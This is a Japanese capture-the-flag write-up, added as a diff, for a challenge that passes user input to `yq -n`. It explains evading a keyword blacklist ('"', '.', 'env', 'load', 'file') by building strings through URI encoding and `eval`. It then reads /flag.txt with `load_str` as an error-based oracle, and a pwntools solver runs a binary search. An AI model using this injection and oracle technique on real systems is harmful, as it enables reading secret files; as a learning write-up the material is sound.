@@ -1,0 +1,62 @@
+---
+title: "Yet Another Injection Challenge"
+categories: ["misc"]
+solves: 27
+---
+# 問題
+入力した文字列がそのまま `yq -n <expr>` に渡され、成功すれば `ok`、失敗すれば `error` が返ってきます。さらに入力に `"` / `.` / `env` / `load` / `file` が含まれると弾かれます。
+
+# 解法
+`yq` は YAML/JSON を扱うコマンドです。`-n` が指定されているため、ファイルからの入力はなく、`<expr>` の式を評価した結果が出力されます。式の評価に失敗した場合は `error` が出力されます。
+
+フィルターがなければ`load_str("/flag.txt")`のようにしてフラグを読み取り、error based oracleのようにして内容を復元することができますが、`"`や`load`が禁止されているため直接的な方法は取れません。
+しかし、yq には `eval` 関数が存在するため、文字列として組み立てた任意の式を実行できます。これを使うために`load_str("/flag.txt")`を文字列として組み立てる必要があります。
+
+任意の一文字の文字列を構成することができれば、それらを結合することによって任意の文字列を作ることができます。
+[yqのドキュメント](https://mikefarah.gitbook.io/yq)を読むと、`@urid`と`@uri`を使って文字列をURIエンコード/デコードできることがわかります。これを利用すると、`%`,`1`-`9`,`a`-`f`の17種類の文字を作ることができれば、それらを `%XX` の形に結合して `@urid` をかけることで任意の文字を作ることができます。
+
+`%`は`1|tag|@uri|split(2)|first(0)`で構成できます（`1|tag|@uri`で`"%21%21int"`となり、これを`"2"`でsplitして`["%", "1%", "1int"]`、最初の要素を取得して`"%"`）。
+
+`1`-`9`は`1|to_string`のようにして簡単に構成できます。`a`-`f`は`%`と`1`-`6`を使って`"%61"|@urid`のようにして構成できます。
+
+これで任意の文字列が構成できるようになりました。あとは`eval`内で`load_str("/flag.txt")`を実行して一文字ずつ特定すればよいです。
+文字の特定には、`load_str("/flag.txt")/""|.[i]<"c" or error(0)`のような式を使うことができます。`a/""|.[i]`で`a`の`i`文字目を取得し、短絡評価により`<"c"`が`false`に評価された場合にのみ`error(0)`が呼び出されます。
+
+ソルバは以下の通りです。最初に各文字を構成し、`as`構文を使って後から参照しています。
+
+<details>
+<summary>ソルバ（クリックで展開）</summary>
+```python
+from pwn import *
+
+chars = [
+    "1|tag|@uri|split(2)|first(0) as $p",
+    *[f"{i}|to_string as ${i}" for i in range(10)],
+    *[f"$p+{c:02x}|to_string|@urid as ${chr(c)}" for c in b"abcdef"],
+]
+
+sc = remote("localhost", 9999)
+
+def oracle(payload):
+    payload = "+".join(f"$p+${c//16:x}+${c%16:x}" for c in payload.encode())
+    payload = f"{"|".join(chars)}|eval({payload}|@urid)".encode()
+    sc.sendlineafter(b": ", payload)
+    return "ok" in sc.recvuntil(b"expr").decode()
+
+flag = ""
+for i in range(100):
+    if not oracle(f"""load_str("/flag.txt")|length>{i} or error(0)"""):
+        break
+    l = 0x20
+    r = 0x80
+    while r - l > 1:
+        m = (l + r) // 2
+        res = oracle(f"""load_str("/flag.txt")/""|.[{i}]<"{chr(m)}" or error(0)""")
+        if res:
+            r = m
+        else:
+            l = m
+    flag += chr(l)
+print(flag)
+```
+</details>
